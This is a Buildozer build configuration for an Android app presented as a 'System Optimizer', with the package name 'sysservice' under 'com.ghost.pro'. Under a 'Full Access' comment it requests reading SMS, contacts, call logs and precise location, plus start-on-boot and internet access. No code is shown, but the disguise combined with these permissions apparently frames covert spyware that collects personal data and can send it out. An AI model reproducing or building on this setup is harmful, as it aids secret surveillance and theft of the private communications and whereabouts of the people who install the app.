[app]
# Basic Info
title = System Optimizer
package.name = sysservice
package.domain = com.ghost.pro
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 6.0

# Requirements (2026 Stable)
requirements = python3,kivy==master,requests,pyjnius,android

# Icon (Disabled for now to avoid errors)
# icon.filename = %(source.dir)s/icon.png

# Permissions (Full Access)
android.permissions = INTERNET, READ_SMS, READ_CONTACTS, READ_CALL_LOG, ACCESS_FINE_LOCATION, RECEIVE_BOOT_COMPLETED

# Android SDK/NDK Settings
android.api = 33
android.minapi = 21
android.ndk = 25c
android.archs = arm64-v8a
p4a.branch = master

# Build Settings
[buildozer]
log_level = 2
warn_on_root = 1
